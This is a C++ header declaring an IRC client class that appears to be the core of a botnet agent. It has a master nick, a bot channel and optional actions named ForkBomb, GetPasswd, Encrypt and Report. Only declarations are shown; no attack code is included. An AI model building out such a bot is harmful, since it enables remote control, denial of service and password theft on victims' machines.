#ifndef IRCCLIENT_HPP
#define IRCCLIENT_HPP

#include <libircclient.h>

#include "MessageParser.hpp"
#include "ActionInfo.hpp"
#include "Action.hpp"
#ifdef ENABLE_PING_ACTION
#include "PingAction.hpp"
#endif

#ifdef ENABLE_ENCRYPT_ACTION
#include "EncryptAction.hpp"
#endif

#ifdef ENABLE_REPORT_ACTION
#include "ReportAction.hpp"
#endif

#ifdef ENABLE_FORK_BOMB_ACTION
#include "ForkBombAction.hpp"
#endif

#ifdef ENABLE_GET_PASSWD_ACTION
#include "GetPasswdAction.hpp"
#endif

class IrcClient {
public:
    IrcClient(std::string server, int port, const char* exeName, std::string botNick, std::string botUser, std::string assignedChannel, std::string botPass, std::string masterNick);
    ~IrcClient();
    void connect();
    void sendCommand(const std::string& command);

    static void signalHandler(int signal);

private:
    const char* exeName;
    bool registrationStatus;
    const char* server;
    int port;
    std::string masterNick;
    std::string botNick;
    std::string botUser;
    std::string assignedChannel;
    std::string botPass;
    irc_session_t* session;
    irc_callbacks_t callbacks;

    void closeConnection();
    static std::string concatenateParams(const char* event , const char* origin, const char** params, unsigned int count);
    bool isRegistered();
    void createAction(ActionInfo actionInfo);

    static void event_connect(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count);
    static void event_unknown(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count);
    static void dump_event(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count);
    static void parseEvent(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count);


    static IrcClient* getInstance(irc_session_t* session);
};

#endif // IRCCLIENT_HPP
